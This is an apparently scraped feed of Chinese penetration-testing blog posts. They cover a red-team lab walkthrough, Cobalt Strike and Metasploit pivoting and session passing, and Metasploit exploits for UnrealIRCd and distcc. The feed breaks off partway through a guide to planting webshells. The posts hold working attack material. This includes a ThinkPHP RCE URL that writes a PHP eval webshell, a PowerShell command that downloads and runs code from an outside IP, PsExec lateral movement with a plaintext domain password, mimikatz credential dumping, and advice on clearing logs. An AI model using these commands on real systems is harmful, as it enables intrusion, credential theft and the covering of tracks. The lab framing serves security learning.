远程代码执行漏洞-POC集合</a></li></ul></li><li><p><strong>找到此版本的poc,然后写一句话木马。</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">135.150</span>/?<span class="keyword">s</span>=<span class="keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="number">0</span>]=<span class="keyword">system</span>&amp;vars[<span class="number">1</span>][]=echo%20^%3C?php%20@eval($_POST[%27cmd%27]);%20?^%3E%20%3E%20C:\phpStudy\PHPTutorial\WWW\public\shell.php</span><br></pre></td></tr></table></figure></li><li><p><strong>蚁剑连接，查看权限，发现居然是域管理员权限！！！</strong></p></li></ul><h4 id="内网渗透-3"><a href="#内网渗透-3" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul><li><p><strong>在横向移动前我们需要收集域内信息。</strong></p><ul><li>内网网段:192.168.138.0/24</li><li>域控ip：192.168.138.138（DNS服务器确定),域名：sun.com</li><li>域用户:admin Administrator krbtgt leo</li></ul></li><li><p><strong>接下来使用CS来完成后续内网渗透工作。</strong></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf" target="_blank" rel="noopener">Cobaltstrike用户手册</a></p></li><li><p><strong>首先使用创建监听器，然后根据需要生成对应监听器的木马，这里我选择生成windows的exe木马。</strong></p></li></ul><p>​       <a href="https://zhuanlan.zhihu.com/p/93718885" target="_blank" rel="noopener">Cobalt Strike简介及生成简易木马</a></p><ul><li><p><strong>使用蚁剑上传到目标服务器，执行，查看cs发现，win7已上线。</strong></p></li><li><p><strong>这里看到上线的用户的只是administrator权限，直接使用cs自带的ms14-058提权（为什么用它提权，因为靶场里提示了。。）</strong></p><p><a href="https://www.freebuf.com/vuls/48239.html" target="_blank" rel="noopener">Win64bit提权0day漏洞（CVE-2014-4113）</a></p><p><a href="https://zhuanlan.zhihu.com/p/94135740" target="_blank" rel="noopener">Beacon详解</a></p></li><li><p><strong>选择提权后，一会就可以看到system权限的win7上线。</strong></p></li><li><p><strong>选择system权限win7,进入Beacon,然后运行mimikatz读到了Administrator和leo的密码</strong></p></li><li><p><strong>因为我们这里已经得到的域控管理员的密码，所以直接找域控登录即可</strong>。</p></li><li><p><strong>使用CS扫一下内网可以用psexec登录的主机，主要看445端口有没有开放</strong>。</p></li><li><p><strong>因为我们这里的DC处于内网，不能直接连接CS,所以我们需要win7做一个跳板机器</strong>。</p></li><li><p><strong>在win7上设置新的监听，上传psexec，设置防火墙规则。</strong></p><ul><li><pre><code>netsh advfirewall firewall add rule name=cs dir=in action=allow protocol=TCP localport=6666<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>*<span class="strong">*最后使用PsExec登录DC域控。*</span><span class="strong">*</span></span><br><span class="line"><span class="strong"></span></span><br><span class="line"><span class="strong">  -</span></span><br></pre></td></tr></table></figure>Shell C:\phpStudy\PHPTutorial\WWW\public\PsExec64.exe -accepteula \\192.168.138.138 -u sun\Administrator -p dc123.com -d -c C:\phpStudy\PHPTutorial\WWW\public\nei.exe</code></pre></li></ul></li><li><p><strong>此时可以看到dc主机也已经上线</strong></p></li><li><p><strong>日志和入侵痕迹清除，主要是我们上传的木马文件，添加的管理员。以及系统日志、web应用日志、防火墙日志等内容。</strong></p><ul><li><a href="https://blog.csdn.net/God_XiangYu/article/details/100056932" target="_blank" rel="noopener">后渗透篇：清理windows入侵痕迹总结</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;红日安全ATT-amp-CK靶场-一&quot;&gt;&lt;a href=&quot;#红日安全ATT-amp-CK靶场-一&quot; class=&quot;headerlink&quot; title=&quot;红日安全ATT&amp;amp;CK靶场(一)&quot;&gt;&lt;/a&gt;红日安全ATT&amp;amp;CK靶场(一)&lt;/h2&gt;&lt;h4 id=
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="ATT&amp;CK" scheme="https://shu1l.github.io/tags/ATT-CK/"/>
    
  </entry>
  
  <entry>
    <title>msf与cs联动</title>
    <link href="https://shu1l.github.io/2020/06/05/msf-yu-cs-lian-dong/"/>
    <id>https://shu1l.github.io/2020/06/05/msf-yu-cs-lian-dong/</id>
    <published>2020-06-05T13:40:00.000Z</published>
    <updated>2020-06-06T03:08:14.956Z</updated>
    
    <content type="html"><![CDATA[<p><strong>转载自:</strong><a href="https://www.secshi.com/21526.html" target="_blank" rel="noopener">https://www.secshi.com/21526.html</a></p><p><strong>前言</strong></p><p>CobalStrike 与 Metasploit 均是渗透利器，各有所长。前者更适合做稳控平台，后者则更擅长内网各类探测搜集与漏洞利用。两者更需要灵活的联动，各自相互依托，从而提升渗透的效率。</p><p><strong>内置Socks功能</strong></p><p>通过Beacon内置的socks功能在VPS上开启代理端口，打通目标内网通道，之后将本地Metasploit直接带入目标内网，进行横向渗透。</p><p>当然，也可以把代理设置在其他的工具上，不限于Proxychains、Proxifier等。</p><p>首先，到已控目标机的Beacon下将socks代理开启。</p><p>1 | beacon &gt; socks 1024 #端口根据VPS实际情况进行设置</p><p><img src="http://img.payloads.cn/blog/2019-12-10-165921.png" alt="img"></p><p>点开菜单栏中的View &gt; Proxy Pivots，复制代理连接到Metasploit中。</p><p><img src="http://img.payloads.cn/blog/2019-12-10-165926.png" alt="img"></p><p>本地启动Metasploit，挂上代理，就可以对目标内网进行各种探测搜集。如 探测目标内网中存在MS17_010漏洞的主机，这也是内网拿主机权限利用方式之一。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">setg</span> <span class="string">Proxies</span> <span class="string">socks4/5:ip:port</span> <span class="comment">#让msf所有模块的流量都通过此代理走。(setg全局设置)</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">setg</span> <span class="string">ReverseAllowProxy</span> <span class="literal">true</span> <span class="comment">#允许反向代理，通过socks反弹shell，建立双向通道。(探测可以不设置此项)</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">use</span> <span class="string">auxiliary/scanner/smb/smb_ms17_010</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">rhosts</span> <span class="number">192.168</span><span class="number">.144</span><span class="number">.0</span><span class="string">/24</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">set</span> <span class="string">threads</span> <span class="number">100</span> <span class="comment">#内网渗透时线程不要太高！</span></span><br><span class="line"><span class="string">msf5</span> <span class="string">&gt;</span> <span class="string">run</span></span><br></pre></td></tr></table></figure><p><img src="http://img.payloads.cn/blog/2019-12-04-101356.jpg" alt="img"></p><p><strong>利用MSF模块上线Beacon shell</strong></p><p>当通过其它方式拿到了目标内网中某台Windows机器的本地管理员明文密码或hash时，可利用Metasploit下auxiliary/admin/smb/psexec_command模块，直接上线指定目标机器的Beacon shell。<strong>(前提目标机可出网)</strong></p><p>先利用CobalStrike生成上线Beacon的powershell。</p><p><img src="http://img.payloads.cn/blog/2019-12-10-165938.png" alt="img"></p><p>本地启动Metasploit，挂上代理，设置psexec_command模块参数。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; setg Proxies socks4/5:ip:port</span><br><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> rhosts 192.168.144.0/24</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> threads 10</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> smbuser administrator</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> smbpass aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 #明文、密文均可</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> command powershell.exe -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://149.28.xx.xx:80/a'))"</span> #上线CS的powershell，目标机存在杀软需考虑</span><br><span class="line">msf5 &gt; run</span><br></pre></td></tr></table></figure><p><img src="http://img.payloads.cn/blog/2019-12-10-165946.png" alt="img"></p><p>最终，只要密码一致、 能出网，且未被杀软阻止的均会成功上线。</p><h4 id="CS与MSF会话互传"><a href="#CS与MSF会话互传" class="headerlink" title="CS与MSF会话互传"></a>CS与MSF会话互传</h4><h5 id="CobaltStrike派生Metasploit"><a href="#CobaltStrike派生Metasploit" class="headerlink" title="CobaltStrike派生Metasploit"></a>CobaltStrike派生Metasploit</h5><p>​    当CobaltStrike获得了一个上线机器，想把这个目标传给Metasploit中的meterpreter，获得一个session进行控制。在Metasploit执行以下命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_tcp #不要用x64的payload</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lhost 10.11.42.99</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lport 5353</span><br><span class="line">msf5 &gt; <span class="builtin-name">run</span> -j</span><br></pre></td></tr></table></figure><p><img src="http://img.payloads.cn/blog/2019-12-04-101361.jpg" alt="img"></p><p>之后使用CobaltStrike创建一个windows/foreign/reverse_tcp的Listener。其中IP为Metasploit的监听地址，端口为Metasploit所监听的端口。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101405.jpg" alt="img"></p><p>然后选中计算机，右键-&gt;Spawn：选择MSF的监听器：</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101362.jpg" alt="img"></p><p>这个时候可以看到，Metasploit上的监听已经上线，现在可以对meterpreter获得的session进行控制。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101340.jpg" alt="img"></p><h5 id="Metasploit派生CobaltStrike"><a href="#Metasploit派生CobaltStrike" class="headerlink" title="Metasploit派生CobaltStrike"></a>Metasploit派生CobaltStrike</h5><p>现在已经获得了一个meterpreter的session，把session传给CobaltStrike。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101408.jpg" alt="img"></p><p>在CobaltStrike中创建一个监听者，和上一步类似，这里host需要修改为CobaltStrike客户端IP，创建好之后便监听8099端口，等待着被控机连接。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101359.jpg" alt="img"></p><p>接下来，把meterpreter获得的session转交给CobaltStrike，在Metasploit执行以下命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">msf5 &gt; use exploit/windows/local/payload_inject </span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lhost 192.168.144.174</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> lport 8099</span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> DisablePayloadHandler <span class="literal">true</span>  </span><br><span class="line">msf5 &gt; <span class="builtin-name">set</span> session 1</span><br><span class="line">msf5 &gt; run</span><br></pre></td></tr></table></figure><p>解释一下这些参数。由于CobaltStrike的监听器我们使用的是：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows<span class="regexp">/beacon_http/</span>reverse_http</span><br></pre></td></tr></table></figure><p>所以我们的payload也要使用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload windows<span class="regexp">/meterpreter/</span>reverse_http</span><br></pre></td></tr></table></figure><p>设置本地监听IP和端口：由于监听器是CobaltStrike的，所以要<strong>设置成CobaltStrike机器的IP与端口。</strong></p><p>默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，这里我们设置：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> DisablePayloadHandler <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>设置当前的session，执行run。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101342.jpg" alt="img"></p><p>此时目标机便已成功从CobaltStrike上线。</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101341.jpg" alt="img"></p><p><strong>总结</strong></p><p>关于CobalStrike与Metasploit 的联动利用方式远不止这些，每种方式在实战中都有对应的应用场景，更需要探索与总结。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;转载自:&lt;/strong&gt;&lt;a href=&quot;https://www.secshi.com/21526.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.secshi.com/21526.html&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://shu1l.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="msf" scheme="https://shu1l.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>经典漏洞msf攻击实验记录</title>
    <link href="https://shu1l.github.io/2020/04/30/msf-gong-ji-shi-yan-ji-lu/"/>
    <id>https://shu1l.github.io/2020/04/30/msf-gong-ji-shi-yan-ji-lu/</id>
    <published>2020-04-30T07:54:24.000Z</published>
    <updated>2020-06-05T10:03:57.967Z</updated>
    
    <content type="html"><![CDATA[<h2 id="经典漏洞MSF攻击实验记录"><a href="#经典漏洞MSF攻击实验记录" class="headerlink" title="经典漏洞MSF攻击实验记录"></a>经典漏洞MSF攻击实验记录</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记录一些自己使用msf进行的一些实验。</p><h3 id="msf利用UnrealIRCd后门漏洞攻击"><a href="#msf利用UnrealIRCd后门漏洞攻击" class="headerlink" title="msf利用UnrealIRCd后门漏洞攻击"></a>msf利用UnrealIRCd后门漏洞攻击</h3><p><strong>攻击主机：</strong>Kali linux, IP地址：192.168.153.176</p><p><strong>漏洞主机：</strong>linux   IP地址：192.168.153.131</p><h4 id="nmap扫描开放端口"><a href="#nmap扫描开放端口" class="headerlink" title="nmap扫描开放端口"></a>nmap扫描开放端口</h4><p> 利用命令： nmap -sT -v 10.1.1.136 扫描漏洞主机开放端口信息,扫描结果如下</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -v <span class="number">192.168</span><span class="number">.153</span><span class="number">.131</span></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200429210327.png" alt=""></p><h4 id="UnrealIRCd后门漏洞简介"><a href="#UnrealIRCd后门漏洞简介" class="headerlink" title="UnrealIRCd后门漏洞简介"></a>UnrealIRCd后门漏洞简介</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CVE：CVE<span class="number">-2010</span><span class="number">-2075</span></span><br><span class="line"></span><br><span class="line">BID：BID<span class="number">-40820</span></span><br><span class="line"></span><br><span class="line">OSVDB：OSVDB<span class="number">-65445</span></span><br></pre></td></tr></table></figure><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>​        在2009年11月到2010年6月间分布于某些镜面站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码，影响系统/软件 Unreal UnrealIRCd 3.2.8.1。</p><h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><h5 id="1-分析可以利用的漏洞"><a href="#1-分析可以利用的漏洞" class="headerlink" title="1.分析可以利用的漏洞"></a>1.分析可以利用的漏洞</h5><p>根据Nmap扫描结果可知，6667号端口开放IRC服务，可以利用UnrealIRCD IRC软件的漏洞来攻击漏洞主机</p><h5 id="2-开启Msfconsole"><a href="#2-开启Msfconsole" class="headerlink" title="2. 开启Msfconsole"></a>2. 开启Msfconsole</h5><p>运行“msfconsole”命令开启msf</p><h5 id="3-搜索漏洞利用EXP"><a href="#3-搜索漏洞利用EXP" class="headerlink" title="3. 搜索漏洞利用EXP"></a>3. 搜索漏洞利用EXP</h5><p> 运行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">search unrealircd</span></span><br></pre></td></tr></table></figure><p>命令搜索关于UnrealIRCD漏洞的利用信息</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429210558.png" alt=""></p><h5 id="设置漏洞利用exp"><a href="#设置漏洞利用exp" class="headerlink" title="设置漏洞利用exp"></a>设置漏洞利用exp</h5><p>使用’show options’ 命令查看该exploit的参数设置信息，发现执行该EXP前可以配置漏洞主机的IP和端口</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211137.png" alt=""></p><h5 id="执行查看结果"><a href="#执行查看结果" class="headerlink" title="执行查看结果"></a>执行查看结果</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211204.png" alt=""></p><h3 id="利用Distcc后门漏洞攻击"><a href="#利用Distcc后门漏洞攻击" class="headerlink" title="利用Distcc后门漏洞攻击"></a>利用Distcc后门漏洞攻击</h3><h4 id="Distcc后门漏洞"><a href="#Distcc后门漏洞" class="headerlink" title="Distcc后门漏洞"></a>Distcc后门漏洞</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安全组织索引</span><br><span class="line">CVE：CVE<span class="number">-2004</span><span class="number">-2687</span></span><br><span class="line">BID：无</span><br><span class="line">OSVDB：OSVDB<span class="number">-13378</span></span><br></pre></td></tr></table></figure><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><pre><code>Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制，影响系统 distcc 2.x</code></pre><h4 id="攻击过程-1"><a href="#攻击过程-1" class="headerlink" title="攻击过程"></a>攻击过程</h4><ol><li><h5 id="开启Msfconsole"><a href="#开启Msfconsole" class="headerlink" title="开启Msfconsole"></a>开启Msfconsole</h5><p>运行<code>msfconsole</code>命令开启msf</p></li><li><h5 id="搜索漏洞利用EXP"><a href="#搜索漏洞利用EXP" class="headerlink" title="搜索漏洞利用EXP"></a>搜索漏洞利用EXP</h5><p>运行<code>search distcc</code>命令搜索关于Distcc_exec 漏洞的利用信息</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211425.png" alt=""></p></li></ol><ol start="3"><li><h5 id="运行漏洞利用EXP"><a href="#运行漏洞利用EXP" class="headerlink" title="运行漏洞利用EXP"></a>运行漏洞利用EXP</h5><p>运行<code>use exploit/unix/misc/distcc_exec</code>命令开始运行EXP</p></li></ol><p><img src="QQ%E6%88%AA%E5%9B%BE20200429211846.png" alt=""></p><p>设置漏洞主机IP</p><p>运行<code>set RHOST 10.1.1.136</code>命令设置漏洞主机IP</p><p>运行<code>exploit</code>命令，成功建立shell回话</p><h5 id="6-验证shell权限"><a href="#6-验证shell权限" class="headerlink" title="6.验证shell权限"></a>6.验证shell权限</h5><p>运行linux系统命令“whoami”，回显“root”说明当前shell的权限是root权限，可进行任意操作而不受权限控制.</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200429212150.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;经典漏洞MSF攻击实验记录&quot;&gt;&lt;a href=&quot;#经典漏洞MSF攻击实验记录&quot; class=&quot;headerlink&quot; title=&quot;经典漏洞MSF攻击实验记录&quot;&gt;&lt;/a&gt;经典漏洞MSF攻击实验记录&lt;/h2&gt;&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; cla
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="msf" scheme="https://shu1l.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>拿WebShell 方法</title>
    <link href="https://shu1l.github.io/2020/04/30/na-webshell-fang-fa/"/>
    <id>https://shu1l.github.io/2020/04/30/na-webshell-fang-fa/</id>
    <published>2020-04-30T02:00:12.529Z</published>
    <updated>2020-06-05T10:05:00.433Z</updated>
    
    <content type="html"><![CDATA[<h2 id="拿WebShell-方法"><a href="#拿WebShell-方法" class="headerlink" title="拿WebShell 方法"></a>拿WebShell 方法</h2><h3 id="拿WebShell-的两种类型"><a href="#拿WebShell-的两种类型" class="headerlink" title="拿WebShell 的两种类型"></a>拿WebShell 的两种类型</h3><ul><li>管理权限拿WebShell （可以理解为进后台拿WebShell）</li><li>普通权限拿WebShell（可以理解为不进后台拿WebShell）</li></ul><p>下面附一张拿WebShell的思维导图，图如下：</p><p> <img src="https://img-blog.csdnimg.cn/20190816232239336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dvZF9YaWFuZ1l1,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="管理权限拿WebShell-常见的方法归纳为14种："><a href="#管理权限拿WebShell-常见的方法归纳为14种：" class="headerlink" title="管理权限拿WebShell 常见的方法归纳为14种："></a>管理权限拿WebShell 常见的方法归纳为14种：</h4><h5 id="1、正常上传"><a href="#1、正常上传" class="headerlink" title="1、正常上传"></a>1、正常上传</h5><ul><li><p>网站对上传文件后缀格式并未过滤，直接上传WebShell即可</p><p>大概思路是，已知后台管理员账号和密码，找有上传节点的地方，写一个隐蔽或变形的木马上传，上传成功后，用菜刀或蚁剑连接。</p><p> 注：为什么要写一个隐蔽或变形的木马呢？因为如果你用的常见的木马，只要一上传就会被管理员或WAF发现（常见的木马WAF都是有收集的，所以可以写完木马之后用D盾检查一下，被WAF检测出来的危险等级是多少）</p></li></ul><h5 id="2、数据库备份拿WebShell"><a href="#2、数据库备份拿WebShell" class="headerlink" title="2、数据库备份拿WebShell"></a>2、数据库备份拿WebShell</h5><p>​        网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如 asp、php、jsp、aspx等。而网站具有数据库备份功能，这时我们就可以将WebShell格式先改为允许上传的文件格式，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。</p><p>注：</p><ul><li>1）有些备份数据库的地方，限制了用户更改路径，那该怎么办？</li></ul><p>F12打开开发者工具，修改文本框元素的value值为我们想要的路径或格式就可以完成修改</p><ul><li><p>如果上传的格式被限制呢？该怎么办？</p><p>可以使用%00截断来绕过上传限制或使用BurpSuite 工具（%00截断、特殊名文件名绕过、文件名大小写绕过等等黑白名单绕过，</p></li></ul><h5 id="3、本地js验证突破拿WebShell"><a href="#3、本地js验证突破拿WebShell" class="headerlink" title="3、本地js验证突破拿WebShell"></a><strong>3、本地js验证突破拿WebShell</strong></h5><p> 当网站设置了js来限制用户上传的文件类型时，可以通过删除js验证或者修改上传类型突破上传拿WebShell。</p><p>   使用BurpSuite 或者是 Fiddle等代理工具提交，本地文件先更改为jpg，上传时拦截，再把文件扩展名更改为asp或者php即可</p><h5 id="4、上传其它脚本类型拿WebShell"><a href="#4、上传其它脚本类型拿WebShell" class="headerlink" title="4、上传其它脚本类型拿WebShell"></a><strong>4、上传其它脚本类型拿WebShell</strong></h5><ul><li>此类型用于一台服务器具有多个网站，a网站是asp的站，b可能是php的站，而a站中限制了上传文件类型为asp的文件，你可以尝试上传php的脚本，来拿Shell</li></ul><ul><li>你也可以尝试将脚本文件后缀名改为asa 或者在后面直接加个点（.）如”xx.asp.” 来突破文件类型限制进行上传拿WebShell</li></ul><h5 id="5、-00截断拿WebShell"><a href="#5、-00截断拿WebShell" class="headerlink" title="5、%00截断拿WebShell"></a><strong>5、%00截断拿WebShell</strong></h5><ul><li>在上传文件的时候，你上传的文件名可能会被网站自动改成别的名字，这个时候你可以尝试抓取上传文件数据包，将文件名改为xx.asp%00.jpg进行截断上传，拿WebShell</li></ul><h5 id="6、利用解析漏洞拿WebShell"><a href="#6、利用解析漏洞拿WebShell" class="headerlink" title="6、利用解析漏洞拿WebShell"></a><strong>6、利用解析漏洞拿WebShell</strong></h5><ul><li>IIS5.x / 6.0 解析漏洞</li><li>IIS 7.0 / IIS 7.5 / Nginx &lt;8.03 畸形解析漏洞</li><li>Nginx &lt; 8.03 空字节代码执行漏洞</li><li>Apache 解析漏洞</li></ul><h5 id="7、利用编辑器漏洞拿WebShell"><a href="#7、利用编辑器漏洞拿WebShell" class="headerlink" title="7、利用编辑器漏洞拿WebShell"></a><strong>7、利用编辑器漏洞拿WebShell</strong></h5><p>​         利用网站的编辑器上传木马，搜索已知的编辑器漏洞，常见的编辑器有 fckeditor、ewebeditor、cheditor等，有时候没有管理员权限也可以拿下webshell。</p><h5 id="8、网站配置插马拿WebShell"><a href="#8、网站配置插马拿WebShell" class="headerlink" title="8、网站配置插马拿WebShell"></a><strong>8、网站配置插马拿WebShell</strong></h5><p>​            通过找到网站默认配置，将一句话插入到网站配置中，不过为了能够成功执行插马，建议先下载该站源码，进行查看源码过滤规则，以防插马失败。</p><p>PS：插马失败很有可能会导致网站被你写的一句话木马，没有闭合标签导致被网站被插废。</p><p> <code>&quot;%&gt;&lt;%eval request(&quot;cracer&quot;)%&gt;&lt;%&#39;</code><br>            注意：我这里构造的是下载了程序的源码，然后在config.asp文件里的代码来修改的。不同的版本的网站源码都不一样，实际问题实际分析，在此就不做多的解释了。这里最后的单引号（’）是注释当前行后面所有的内容。</p><h5 id="9、通过编辑模块拿WebShell"><a href="#9、通过编辑模块拿WebShell" class="headerlink" title="9、通过编辑模块拿WebShell"></a><strong>9、通过编辑模块拿WebShell</strong></h5><ul><li>通过对网站的模块进行编辑写入一句话，然后生成脚本文件拿WebShell</li><li>通过将木马添加到压缩文件，把名字改为网站模板类型，上传到网站服务器，拿WebShell</li></ul><h5 id="10、修改脚本直接拿WebShell"><a href="#10、修改脚本直接拿WebShell" class="headerlink" title="10、修改脚本直接拿WebShell"></a><strong>10、修改脚本直接拿WebShell</strong></h5><p> 有的网站可以修改添加脚本文件，可以直接拿WebShell</p><p>注：织梦的后台，大家可以下个织梦后台网站源码，复现一下</p><h5 id="11、数据库命令执行拿WebShell"><a href="#11、数据库命令执行拿WebShell" class="headerlink" title="11、数据库命令执行拿WebShell"></a>11、数据库命令执行拿WebShell</h5><p>可以通过phpmyadmin 登录数据库使用数据库命令来写如一句话拿WebShell</p><p><strong>大致步骤：</strong></p><ul><li>创建表</li><li>将一句话写入刚创建的表中</li><li>查询一句话所在表到文件，成功将一句话写入文件</li><li>注：这个前提条件是需要有一定的数据库权限</li></ul><h5 id="12、上传特殊木马拿WebShell"><a href="#12、上传特殊木马拿WebShell" class="headerlink" title="12、上传特殊木马拿WebShell"></a>12、上传特殊木马拿WebShell</h5><p>一些网站安装了WAF 安全狗、360，我们可以通过上传一些免杀马，变形木马来进行突破封杀</p><h5 id="13、文件包含拿WebShell"><a href="#13、文件包含拿WebShell" class="headerlink" title="13、文件包含拿WebShell"></a>13、文件包含拿WebShell</h5><p>先将WebShell 改为txt格式文件上传，然后上传一个脚本文件包含该txt格式文件，可绕过WAF拿WebShell</p><p>   ASP 包含：</p><p><code>&lt;!--#include file = &quot;1.jpg&quot;--&gt;</code></p><ol start="2"><li><p>调用的文件必须和被调用文件在同一目录，否则找不到</p></li><li><p>如果不在同一目录，用下面的语句：</p><p> <code>&lt;!--#include virtual=&quot;文件所在目录/1.jpg&quot;--&gt;</code><br>  PHP 包含：</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">   <span class="keyword">include</span>(<span class="string">'1.jpg'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>注：这种情况一般是，我们已经通过菜刀拿下了权限了，假设菜刀一句话木马可以过安全狗，但大马却怎么都没有上传成功，绕过安全狗</p><p>解决发现大马上传不了，被防火墙或者安全狗拦截时，可以考虑使用包含文件</p><p>思路如下：</p><pre><code> 1）先上传一个含有包含代码（如&lt;!-- #include file=&quot;x.jpg&quot; --&gt;）却没有攻击代码的文件，不会被狗拦 